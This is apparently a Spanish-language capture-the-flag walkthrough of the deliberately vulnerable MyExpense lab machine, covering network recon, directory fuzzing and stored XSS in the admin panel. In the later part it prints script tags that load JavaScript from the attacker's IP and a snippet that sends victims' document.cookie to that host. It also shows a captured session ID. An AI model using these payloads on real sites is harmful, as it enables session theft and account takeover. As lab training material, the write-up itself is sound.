Hay un escenario dentro de esta maquina que es el siguiente: 
## Descripción

MyExpense es una aplicación web deliberadamente vulnerable que le permite entrenar en la detección y explotación de diferentes vulnerabilidades web. A diferencia de una aplicación "desafiante" más tradicional (que le permite entrenar en una sola vulnerabilidad específica), MyExpense contiene un conjunto de vulnerabilidades que necesita explotar para lograr todo el escenario.

## Escenario

Eres "Samuel Lamotte" y acabas de ser despedido por tu empresa "Furtura Business Informatique". Desafortunadamente debido a su salida apresurada, usted no tuvo tiempo para validar su informe de gastos para su último viaje de negocios, que todavía asciende a 750 . correspondiente a un vuelo de regreso a su último cliente.

Temiendo que su antiguo empleador puede no querer reembolsarle por este informe de gastos, usted decide hackearlo en la aplicación interna llamada **"MyExpense "** para gestionar los informes de gastos de los empleados.

Así que estás en tu coche, en el aparcamiento de la empresa y conectado al Wi-Fi interno (la clave todavía no ha sido cambiada después de tu salida). La aplicación está protegida por autenticación de nombre de usuario/contraseña y espera que el administrador aún no haya modificado o eliminado su acceso.

Sus credenciales eran: samuel/fzghn4lw

Una vez hecho el desafío, la bandera se mostrará en la aplicación mientras está conectada con su cuenta (samuel).

----

## fase de reconocimiento: 
utilizando arp-scan: 
![[Pasted image 20240222161344.png]]
Podemos ver que con el comando ip a obtenemos nuestro propia ip (192.168.1.89), y con arp-scan podemos ver que la ip de la maquina que queremos atacar es la (192.168.1.88).
Ahora también podemos utilizar el escaneo de nmap para asegurarnos de que este dato sea bueno: 
![[Pasted image 20240222161547.png]]
Vemos que esto nos confirma la información de que la maquina que queremos atacar es la 192.168.1.88
## Fase de reconocimiento de puertos: 

![[Pasted image 20240222165722.png]]
podemos hacer el escaneo de los puertos que nos dicen estar abiertos: 
![[Pasted image 20240223113123.png]]
bueno ya sabemos que tenemos una pagina web en la maquina a explotar: 
![[Pasted image 20240223113634.png]]
para obtener más información podemos ver que tecnologías ocupa la pagina web, con wappalizer o whatweb, aplicaremos ambas para poder estar seguros de la información: 
![[Pasted image 20240223114030.png]]
![[Pasted image 20240223114107.png]]
con esto no tenemos nada interesante aun por lo que tenemos que empezar a hacer fuzzing de la página para poder encontrar directorios: 
![[Pasted image 20240223114535.png]]
ya que vemos que los status de estos son 301, podemos hacer por busquedas especificas con el parametro `-x php,php.bak,bak` estos son algunos de las extenciones que más se ocupan: 
![[Pasted image 20240223114909.png]]
vemos que hay un index.php, signup.php, si entramos a signup.php podremos ver un panel en el cual veremos que podemos crear una cuenta.
![[Pasted image 20240223115139.png]]
rellenamos con dato y al tratar de enviar los datos para crear la cuenta no te deja por que no habilitado el botón de enviar, esto lo podemos habilitarlo cambiando un parametro en el codigo fuente, para esto es necesario apretar el `<F12>`, inspeccionamos la pagina, vamos al boton y borramos la variable que se llama `disabled=""` 
![[Pasted image 20240223120312.png]]
al intentar loguearnos con esta cuenta, pasara que no podemos entrar, por que falta la autorización de la administración:
![[Pasted image 20240223120424.png]]
ahora si vamos a la dirección http://192.168.1.88/admin/admin.php, podemos ver un panel con las cuentas si están habilitadas o deshabilitadas, insertamos otro usuario para ver si nos interpreta lenguaje html, por lo que vemos si nos interpreta etiquetas html, por lo que ahora sería bueno intentar hacer un XSS. 
![[Pasted image 20240223125447.png]]
ahora intentaremos hacer un usuario que contenga un script alert hecho en js. 
![[Pasted image 20240223132100.png]]
con esto podemos ver que si nos interpreta código js, ahora podríamos hacer un External JavaScript source: 
en la cual emplearemos la siguiente etiqueta `<script src="http://192.168.1.89/cookie.js"></script>`
creamos un usuario con esa etiqueta, y hacemos un script llamado cookie.js.
![[Pasted image 20240223135916.png]]
en el cual tomamos la cookie de un usuario que esta haciendo peticiones dentro de la admin.php.
la respuesta hacia el servidor es la siguiente: 
![[Pasted image 20240223140034.png]]
donde vemos que la cookie es `PHPSESSID=25lk998qdcpc1u51l50fnrbqf4` 
ahora que ya tenemos la cookie de un usuario podemos ir a la pagina /admin/admin.php y ver si estamos autenticados:
![[Pasted image 20240223155144.png]]
pasa que no se puede tener en 2 navegadores distintos la misma sesión por lo que tendríamos que investigar como hacer que el usuario logueado habilite la cuenta que nosotros queremos habilitar, en este caso tenemos que hacer un cambio en el script.
si apretamos en la opción de samuel lamotte, para activarlo podemos ver que se manda la petición a través de la url de la pagina de la siguiente forma: 
![[Pasted image 20240223155752.png]]
Lo que tenemos que hacer es modificar el script para que en ves de tomar la cookie de sesión, haga la petición del cambio a activo. 
![[Pasted image 20240223163623.png]]
ese es el script que se enviará.
abrimos el servidor para que se haga la petición: 
![[Pasted image 20240223163713.png]]
ahora podemos ver que nuestra cuenta (slamotte/fzghn4lw) esta activa: 
![[Pasted image 20240224125522.png]]
ahora autenticado, podemos ir a expense reports, para poder enviar nuestro reporte y poder recibir nuestro dinero: 
![[Pasted image 20240224130623.png]]estando en el home podemos hacer una publicacion con las siguientes etiquetas:
`<script src="192.168.1.81/pwned.js"></script>`
en el cual el archivo pwned es un script sencillo para poder obtenes las cookies de los otros usuarios: 
```
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.81/?cookie=' + document.cookie); 
request.send(); 
```
y con eso deberíamos poder obtener las cookies de los demás colaboradores.

